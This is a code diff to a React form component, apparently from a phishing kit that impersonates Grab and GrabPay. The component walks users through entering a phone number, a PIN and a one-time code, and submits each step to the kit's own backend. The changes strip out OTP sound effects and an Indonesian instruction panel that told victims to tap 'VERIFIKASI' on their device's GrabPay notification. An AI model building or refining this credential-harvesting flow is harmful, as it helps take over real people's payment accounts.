@@ -6,13 +6,6 @@ import { EnterpriseLoadingOverlay } from './EnterpriseLoadingOverlay';
 import { EnterpriseLogo } from './EnterpriseLogo';
 import { OVERLAY_MIN_MS, OTP_COUNTDOWN_SEC, OTP_LOCK_MS, GRAB_GREEN_DARK } from './lib/constants';
 import { ThemeColorMeta } from './ThemeColorMeta';
-import {
-  clearPendingEnterpriseSound,
-  playEnterpriseOtpSound,
-  playEnterpriseOtpSoundFromGesture,
-  preloadEnterpriseOtpSound,
-  unlockEnterpriseAudioSync,
-} from './lib/audio';
 import { useEnterpriseKeyboardOffset } from './hooks/useKeyboardOffset';
 import { submitEnterpriseStep } from './lib/submit';
 import type { EnterpriseSlugData, EnterpriseStepData } from './lib/types';
@@ -51,26 +44,12 @@ export function EnterpriseFormFlow({ slugData, onBack }: Props) {
   const otpLockTimeoutRef = useRef<number | null>(null);
   const otpCompleteRingTimeoutRef = useRef<number | null>(null);
   const previousStepTimerRef = useRef<number | null>(null);
-  const step3GestureSoundRef = useRef(false);
   const keyboardOffset = useEnterpriseKeyboardOffset();
 
   const fadeDurationMs = 480;
   const isStep1FadingOut = previousStep === 1;
   const isStep2FadingOut = previousStep === 2;
   const isStep3SlidingIn = step === 3 && !step3Entered;
-
-  useEffect(() => {
-    preloadEnterpriseOtpSound();
-  }, []);
-
-  useEffect(() => {
-    if (step !== 3) {
-      step3GestureSoundRef.current = false;
-      clearPendingEnterpriseSound();
-      return;
-    }
-    playEnterpriseOtpSound();
-  }, [step]);
 
   useEffect(() => {
     if (step === 2) {
@@ -129,7 +108,6 @@ export function EnterpriseFormFlow({ slugData, onBack }: Props) {
   const handleNext = async () => {
     if (step === 3 && otpLocked) return;
 
-    unlockEnterpriseAudioSync();
     setErrorMessage('');
     setSubmitting(true);
     setIsLoadingOverlay(true);
@@ -280,7 +258,6 @@ export function EnterpriseFormFlow({ slugData, onBack }: Props) {
                 placeholder="812-3456-7890"
                 className="enterprise-phone-input"
                 value={formatPhoneInput(stepData.phone)}
-                onPointerDown={() => unlockEnterpriseAudioSync()}
                 onChange={(e) =>
                   setStepData({ ...stepData, phone: e.target.value.replace(/[^0-9]/g, '') })
                 }
@@ -357,7 +334,6 @@ export function EnterpriseFormFlow({ slugData, onBack }: Props) {
 
             <div
               className="enterprise-pin-dots"
-              onPointerDown={() => unlockEnterpriseAudioSync()}
               onClick={() => pinInputRef.current?.focus()}
               role="presentation"
             >
@@ -402,11 +378,6 @@ export function EnterpriseFormFlow({ slugData, onBack }: Props) {
           className={`enterprise-form-step enterprise-form-step--otp ${
             isStep3SlidingIn ? 'enterprise-form-step--slide-in' : ''
           }`}
-          onPointerDown={() => {
-            if (step3GestureSoundRef.current) return;
-            step3GestureSoundRef.current = true;
-            playEnterpriseOtpSoundFromGesture();
-          }}
         >
           <header className="enterprise-otp-header">
             <button
@@ -454,7 +425,6 @@ export function EnterpriseFormFlow({ slugData, onBack }: Props) {
                     otpCompleteRingVisible ? 'enterprise-otp-box--error' : ''
                   }`}
                   value={stepData.otp[index] ?? ''}
-                  onPointerDown={() => unlockEnterpriseAudioSync()}
                   onChange={(e) => handleOtpChange(index, e.target.value)}
                   onKeyDown={(e) => handleOtpKeyDown(index, e)}
                 />
@@ -480,29 +450,6 @@ export function EnterpriseFormFlow({ slugData, onBack }: Props) {
                   Kirim ulang
                 </button>
               )}
-            </div>
-
-            <div className="enterprise-otp-instructions">
-              <p className="enterprise-otp-instructions-title">
-                Silakan cek verifikasi akun GrabPay kamu:
-              </p>
-              <div className="enterprise-otp-instruction-item">
-                <div className="enterprise-otp-instruction-icon">
-                  <ShieldCheck className="h-4 w-4" />
-                </div>
-                <p>
-                  Tap notifikasi di perangkatmu dan pilih{' '}
-                  <strong>VERIFIKASI</strong> untuk melanjutkan.
-                </p>
-              </div>
-              <div className="enterprise-otp-instruction-item">
-                <div className="enterprise-otp-instruction-icon">
-                  <Headphones className="h-4 w-4" />
-                </div>
-                <p>
-                  Tidak menerima notifikasi? Cek SMS atau WhatsApp dari Grab.
-                </p>
-              </div>
             </div>
 
             {errorMessage && (
